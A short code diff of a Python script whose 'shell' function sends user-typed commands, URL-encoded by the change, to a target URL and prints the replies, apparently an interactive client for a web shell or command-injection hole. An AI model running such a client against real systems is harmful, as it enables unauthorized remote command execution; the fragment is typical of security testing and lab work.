@@ -1,12 +1,14 @@
 import argparse
 import requests
+import urllib.parse
 
 def shell(url):
     cmd = 'id'
     while True:
         r = requests.get(url+cmd)
         print(r.text)
-        cmd = input('$ ')
+        cmd = urllib.parse.quote_plus(input('$ '))
+        print(cmd)
 
 
 def main():
